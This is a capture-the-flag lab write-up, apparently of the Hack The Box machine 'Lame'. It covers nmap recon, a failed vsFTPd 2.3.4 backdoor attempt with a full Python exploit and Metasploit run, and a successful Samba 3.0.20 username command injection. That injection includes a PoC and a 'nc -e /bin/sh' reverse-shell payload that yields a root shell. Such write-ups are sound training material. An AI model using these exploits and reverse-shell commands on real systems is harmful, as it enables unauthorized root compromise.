### Summary
We immediately see severely outdated versions of both `FTP` and `SMB` and probe with critical vulnerabilities on both devices. The `vsFTPd 2.3.4` backdoor vulnerability (CVE-2011-2523) fails likely due to firewall restrictions. The `SAMBA 3.0.20` command injection vulnerability (CVE-2007-2447) works without too much headache, immediately granting us a root shell
### Tools
- [[NetExec (nxc)]]
- `smbclient`
- `ftp`
- [[Metasploit]] - testing `FTP` exploit

###### [[#Recon]]
- [[#Initial Scanning]]
- [[#SMB - Port 445]]
- [[#FTP - Port 22]]
###### [[#vsFTPd 2.3.4]]
- [[#CVE-2011-2523]]
	- [[#poc.py]]
	- [[#Metasploit]]
###### [[#SAMBA 3.0.20]]
- [[#CVE-2007-2447]]
	- [[#poc.py]]
###### [[#Root Shell]]
- [[#Upgrading]]
- [[#Find Flag Files]]
- [[#Why vsFTPd 2.3.4 (CVE-2011-2523) Failed]]

---
# Recon
## Initial Scanning
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.43.10 -oN nmap/tcp         
Completed SYN Stealth Scan at 20:11, 13.23s elapsed (65535 total ports)
Nmap scan report for 10.129.43.10
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2025-12-21 20:11:06 EST for 13s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
           Raw packets sent: 131078 (5.767MB) | Rcvd: 15 (644B)
```
```sh
❯ sudo nmap -p 21,22,139,445,3632 -sCV -vv 10.129.43.10 -oN nmap/scripts
Completed NSE at 20:13, 0.00s elapsed
Nmap scan report for 10.129.43.10
Host is up, received echo-reply ttl 63 (0.021s latency).
Scanned at 2025-12-21 20:13:00 EST for 51s

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.50
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: Couldn\'t establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 31928/tcp): CLEAN (Timeout)
|   Check 2 (port 39702/tcp): CLEAN (Timeout)
|   Check 3 (port 58950/udp): CLEAN (Timeout)
|   Check 4 (port 56481/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 34s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.05 seconds
           Raw packets sent: 9 (372B) | Rcvd: 6 (248B)
```
- What sticks out immediately:
	- Anonymous `FTP` login succeeded
		- The version is `vsFTPd 2.3.4`
	- `SMB` guest account successfully logged in

## SMB - Port 445
---
- We can confirm anonymous login to `SMB` and list the shares:
```sh
❯ nxc smb 10.129.43.10 -u '' -p '' --shares
Share           Permissions     Remark
-----           -----------     ------
print$                          Printer Drivers
tmp             READ,WRITE      oh noes!
opt                             
IPC$                            IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$                          IPC Service (lame server (Samba 3.0.20-Debian))
```

- When we try to use `smbclient`, we get `Protocol negotiation to server LAME (for a protocol between SMB2_02 and SMB3) failed: NT_STATUS_CONNECTION_DISCONNECTED`
- Further investigation shows its due to the insecure version
- We can bypass this with the following:
```sh
❯ smbclient -N //LAME/tmp --option='client min protocol=NT1' 
```
- `-N` for anonymous logon
- But big surprise, there's nothing useful in the `tmp` directory

- We can search for exploits for this old `SMB` version:
```sh
❯ searchsploit samba 3.0
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)
Samba 3.0.4 - SWAT Authorisation Buffer Overflow
Samba < 3.0.20 - Remote Heap Overflow
Samba < 3.6.2 (x86) - Denial of Service (PoC)
```
- `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)` looks very promising
```sh
❯ searchsploit -p 16320     
  Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/16320
     Path: /opt/exploitdb/exploits/unix/remote/16320.rb
    Codes: CVE-2007-2447, OSVDB-34700
 Verified: True
File Type: Ruby script, ASCII text
Copied EDB-ID #16320's path to the clipboard
```

## FTP - Port 22
---
- Since `FTP` allows anonymous login, we can snoop around for anything neat in there:
```sh
ftp LAME
Name: anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||31563|).
150 Here comes the directory listing.
226 Directory send OK.
```
- Looks empty

- `FTP` version `vsFTPd 2.3.4` is famously backdoor'd:
```sh
❯ searchsploit vsFTPd 2.3.4
vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
```

# vsFTPd 2.3.4
## CVE-2011-2523
---
- We can find a [poc](https://github.com/4m3rr0r/CVE-2011-2523-poc/blob/main/exploit.py) online and examine the code:
### poc.py
```python
#!/usr/bin/python3

# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 28-11-2023
# Exploit Author: Sheikh Mohammad Hasan (4m3rr0r)
# Version: vsftpd 2.3.4
# CVE : CVE-2011-2523

from pwn import *
import sys
import getopt
from time import sleep

class ExploitFTP:
    def __init__(self, ip, port=21):
        self.ip = ip
        self.port = port
        self.p = log.progress("")
	
    def trigger_backdoor(self):
        try:
            self.p.status("Checking Version...")
            io = remote(self.ip, self.port)
            io.recvuntil(b"vsFTPd ")
            version = (io.recvuntil(b")")[:-1]).decode()
			
            if version != "2.3.4":
                self.p.failure("Version 2.3.4 Not Found!!!")
                exit()
            else:
                self.p.status("Triggering Backdoor....")
                io.sendline(b"USER hello:)")
                io.sendline(b"PASS hello123")
                io.close()
		
        except Exception as e:
            self.p.failure(f"An error occurred: {str(e)}")
            exit()
	
    def get_shell(self):
        try:
            self.p.status("Connecting To Backdoor...")
            sleep(1)
            io = remote(self.ip, 6200)
            self.p.success("Got Shell!!!")
            io.interactive()
            io.close()
		
        except Exception as e:
            self.p.failure(f"An error occurred: {str(e)}")
            exit()

def display_help():
    print(f"Usage: {sys.argv[0]} -t IP [-p PORT]")
    print("Options:")
    print("  -h, --help\t\tShow this help message and exit")
    print("  -t IP\t\t\tTarget IP address")
    print("  -p PORT\t\tTarget port (default is 21)")

if __name__ == "__main__":
    target_ip = None
    target_port = 21
	
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:p:", ["help"])
    except getopt.GetoptError:
        display_help()
        exit()
	
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            display_help()
            exit()
        elif opt == "-t":
            target_ip = arg
        elif opt == "-p":
            target_port = int(arg)
	
    if target_ip is None:
        error("Target IP is required. Use -t option.")
        display_help()
        exit()
	
    try:
        exploit = ExploitFTP(target_ip, target_port)
        exploit.trigger_backdoor()
        exploit.get_shell()
	
    except KeyboardInterrupt:
        print("\nUser interrupted the execution.")
        exit()
```
- Essentially, we can pass the username:password `hello:)`:`hello123`
	- It doesn't really matter, as long as the username ends with `:)` 
- Then we connect to the ip's port `6200`

```sh
❯ nc LAME 21                                      
220 (vsFTPd 2.3.4)
USER :)
331 Please specify the password.
PASS help
530 Login incorrect.
```
```sh
❯ nc LAME 6200
Ncat: TIMEOUT.
```
- doesn't work :(

### Metasploit
- We can try with metasploit just to keep us sharp but it likely will not work
- First, we spawn metasploit with `msfconsole`
```sh
msfconsole
msf > search vsftp
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

msf > use 1
[*] No payload configured, defaulting to cmd/unix/interact # we're fine with this

msf exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS LAME
RHOSTS => LAME

msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.129.43.10:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.43.10:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
- Big surprise, it also failed
- We'll explore why once we get root

# SAMBA 3.0.20
---
## CVE-2007-2447
---
- We can find a [poc](https://github.com/amriunix/CVE-2007-2447) online, it looks very simple:
### poc.py
```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

# From : https://github.com/amriunix/cve-2007-2447
# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
```
- This exploit looks like it's logging into an anonymous SMB share with the username containing a backtick surrounded command injection mkfifo reverse shell

- We don't need to degrade ourselves to the point of a mkfifo reverse shell when we've got netcat:
```sh
❯ smbclient //LAME/tmp -U "./=`nohup nc -e /bin/sh 10.10.14.50 12345`"
nohup: ignoring input and redirecting stderr to stdout
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.10.14.50.
Ncat: Connection from 10.10.14.50:48306.
whoami 
aldamd
```
- The fuck? Zsh must've performed the backtick command execution instead of passing it to `smbclient` because I was using `"`. We can try again using `'` instead

```sh
❯ smbclient //LAME/tmp -U './=`nohup nc -e /bin/sh 10.10.14.50 12345`' --option='client min protocol=NT1'                                                                                                      
Password for [=`NOHUP NC -E \bin/sh 10.10.14.50 12345`]:
session setup failed: NT_STATUS_LOGON_FAILURE
```
- The start of the command is getting capitalized which is fucking with the execution

- There's another way to log in with `smbclient` by using the `logon` command. It allows us to change users while we already have a session. We can first grab one with our anonymous login and then perform the `logon` command:
```sh
❯ smbclient //LAME/tmp -U '' --option='client min protocol=NT1'  
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.50 12345`"
Password: 
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.43.10.
Ncat: Connection from 10.129.43.10:40256.
whoami
root
```
- Incredible stuff!

# Root Shell
## Upgrading
---
- Let's use `python` to upgrade our shell:
```sh
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/# 
```
- Then we background with `CTRL + Z` and then do:
```sh
root@lame:/# ^Z
[1]  + 482562 suspended  nc -lvnp 12345
❯ stty raw -echo; fg                                                  
[1]  + 482562 continued  nc -lvnp 12345
                                       whoami
root
root@lame:/# 
```

## Find Flag Files
---
- We can use the `find` command to quickly find and `cat` the contents of the flag files:
```sh
root@lame:/# find / -type f -name root.txt -exec cat {} +
cc5a9909368b14c5dc95dde02de8505d
root@lame:/# find / -type f -name user.txt -exec cat {} \;
0c5205baae71b5a3835e1eda8adb1d12
```

## Why vsFTPd 2.3.4 (CVE-2011-2523) Failed
---
- If we look at all the listening sockets on the machine:
```sh
root@lame:/# ss -lptn
Recv-Q Send-Q             Local Address:Port               Peer Address:Port 
0      64                             *:512                           *:*      users:(("xinetd",5550,11))
0      64                             *:513                           *:*      users:(("xinetd",5550,10))
0      64                             *:2049                          *:*     
0      64                             *:514                           *:*      users:(("xinetd",5550,9))
0      64                             *:44322                         *:*     
0      50                             *:48742                         *:*      users:(("rmiregistry",5725,8))
0      0                              *:8009                          *:*      users:(("jsvc",5684,63))
0      5                              *:6697                          *:*      users:(("unrealircd",5745,3))
0      5                             :::2121                         :::*      users:(("proftpd",5622,1))
0      128                            *:57834                         *:*      users:(("rpc.mountd",5447,7))
0      50                             *:3306                          *:*      users:(("mysqld",5271,10))
0      50                             *:1099                          *:*      users:(("rmiregistry",5725,7))
0      5                              *:6667                          *:*      users:(("unrealircd",5745,2))
0      50                             *:139                           *:*      users:(("smbd",5525,22))
0      5                              *:5900                          *:*      users:(("Xtightvnc",5746,3))
0      128                            *:52876                         *:*      users:(("rpc.statd",4744,8))
0      128                            *:111                           *:*      users:(("portmap",4726,4))
0      128                            *:6000                          *:*      users:(("Xtightvnc",5746,0))
0      128                            *:80                            *:*      users:(("apache2",5704,3),("apache2",5705,3),("apache2",5707,3),("apache2",5709,3),("apache2",5712,3),("apache2",5714,3))
0      10                            :::3632                         :::*      users:(("distccd",5379,4),("distccd",5380,4),("distccd",5591,4),("distccd",5592,4))
0      5                              *:8787                          *:*      users:(("ruby",5729,3))
0      100                            *:8180                          *:*      users:(("jsvc",5684,49))
0      64                             *:1524                          *:*      users:(("xinetd",5550,12))
0      64                             *:21                            *:*      users:(("xinetd",5550,5))
0      3                   10.129.43.10:53                            *:*      users:(("named",5124,25))
0      3                      127.0.0.1:53                            *:*      users:(("named",5124,23))
0      3                             :::53                           :::*      users:(("named",5124,21))
0      128                           :::22                           :::*      users:(("sshd",5148,3))
0      64                             *:23                            *:*      users:(("xinetd",5550,6))
0      128                            *:5432                          *:*      users:(("postgres",5352,6))
0      128                           :::5432                         :::*      users:(("postgres",5352,3))
0      100                            *:25                            *:*      users:(("master",5515,11))
0      128                          ::1:953                          :::*      users:(("named",5124,29))
0      128                    127.0.0.1:953                           *:*      users:(("named",5124,28))
0      50                             *:445                           *:*      users:(("smbd",5525,21))
```
- We see a fuckload which begs the question why `nmap` only saw the original 5
- It's likely we have a firewall blocking traffic on most ports, and since `CVE-2011-2523` relies on spawning port `6200`, this port is likely being blocked by the firewall




